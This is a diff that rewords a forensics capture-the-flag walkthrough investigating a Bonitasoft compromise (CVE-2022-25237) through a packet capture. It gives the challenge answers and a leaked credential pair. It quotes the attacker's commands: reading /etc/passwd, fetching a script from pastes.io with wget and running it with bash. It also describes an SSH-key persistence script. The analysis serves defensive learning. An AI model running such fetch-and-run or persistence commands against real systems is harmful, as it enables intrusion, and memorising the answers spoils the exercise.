@@ -2,35 +2,35 @@
 
 - filter for `http` in Wireshark 
 - notice URL contains **bonita**
-- open JSON alerts file and search for `bonita` to find entries for **Bonitasoft** (confirm with web search if desired)
+- open JSON alerts file and search for `bonita` to find entries for **Bonitasoft** (confirm with a web search if desired)
 
 ### Answer: `bonitasoft`
 
 ## We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?
 
-- filter for `http.request.method=="POST"` and notice the numeroud logins
+- filter for `http.request.method=="POST"` and take note of the numerous logins
 
-- expand the form information to see different usernames and passwords
+- expand the form information to reveals different usernames and passwords
 
-- looks like **credential stuffing** 
+- looks like a **credential stuffing** attack 
 
 ### Answer: `Credential Stuffing`
 
 ## Does the vulnerability exploited have a CVE assigned - and if so, which one?
 
-- If you searched the JSON alerts file for Bonitasoft you likely already saw a CVE number such as this line (and others): 
+- Searching within the JSON alerts file for "Bonitasoft" reveals multiple lines referencing a CVE number, such as the following: 
 
 ```
 ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237)"
 ```
 
-- One can also do a web search for "Bonitasoft credential stuffing" (or similar) and/or the above CVE number and check the results e.g. NVD page
+- Performing a web search for "Bonitasoft credential stuffing" (or similar) and/or the above CVE number should net results like the NVD page for the CVE as well
 
 ### Answer: `CVE-2022-25237`
 
 ## Which string was appended to the API URL path to bypass the authorization filter by the attacker's exploit?
 
-<p>The NVD description (https://nvd.nist.gov/vuln/detail/CVE-2022-25237) will have this information and we can verify
+<p>The NVD description (https://nvd.nist.gov/vuln/detail/CVE-2022-25237) will have this information and it can be found/verified
 in the PCAP file</p>
 
 Filter: 
@@ -43,14 +43,14 @@ http.request.method=="POST" && http.request.uri contains "i18ntranslation"
 
 ## How many combinations of usernames and passwords were used in the credential stuffing attack?
 
-- Let's look at all the form submissions
+- First filter out all the form submissions
 
 Filter:
 ```
 http.content_type == "application/x-www-form-urlencoded"
 ```
 
-- Taking a closer look at a few results one can see that each one is followed by another showing **install:install**, so let's remove those
+- Reviewing the results shows a pattern that each one set of credentials is followed by another submission with **install:install**, to remove these from the results refine the filter.
 
 Filter:
 
@@ -58,9 +58,10 @@ Filter:
 http.content_type == "application/x-www-form-urlencoded" && urlencoded-form.value != "install"
 ```
 
-- This leaves 59 packets but if looking at the last three one can see the same credentials (**seb.broom@forela.co.uk:g0vernm3nt
+- This leaves 59 packets but in examining the last three one can see the same credentials (**seb.broom@forela.co.uk:g0vernm3nt
 **) indicating a change
-- checking the response comfirms that this credential was successful with a 204 response rather than 401
+
+- checking the response comfirms that this set of credentials was successful with a 204 response rather than 401
 
 - There are 4 packets in the filtered output associated with the successful request meaning that 56 unique username:password attempts were made
 
@@ -74,13 +75,13 @@ http.content_type == "application/x-www-form-urlencoded" && urlencoded-form.valu
 
 ## If any, which text sharing site did the attacker utilise?
 
-After successful authentication the attacket makes a POST request to upload **"rce_api_extension.zip"** then follows up with a few GET requests including **cmd=whoami**, **"cmd=cat%20/etc/passwd"** and ***"cmd=wget%20https://pastes.io/raw/bx5gcr0et8"*** then subsequently executes this file with **"cmd=bash%20bx5gcr0et8"**
+After successful authentication the attacker makes a POST request to upload **"rce_api_extension.zip"** then follows up with a few GET requests including **cmd=whoami**, **"cmd=cat%20/etc/passwd"** and ***"cmd=wget%20https://pastes.io/raw/bx5gcr0et8"*** then subsequently executes this file with **"cmd=bash%20bx5gcr0et8"**
 
 ### Answer: `pastes.io`
 
 ## Please provide the filename of the public key used by the attacker to gain persistence on our host.
 
-Following the link that the wget command used leads to a page with a simple bash script containing a curl command to append an SSH key to authorized_keys and restart the SSH service
+Following the link that the wget command uses leads to a page with a simple bash script containing a curl command to append an SSH key to authorized_keys and restart the SSH service
 
 ```    
 #!/bin/bash
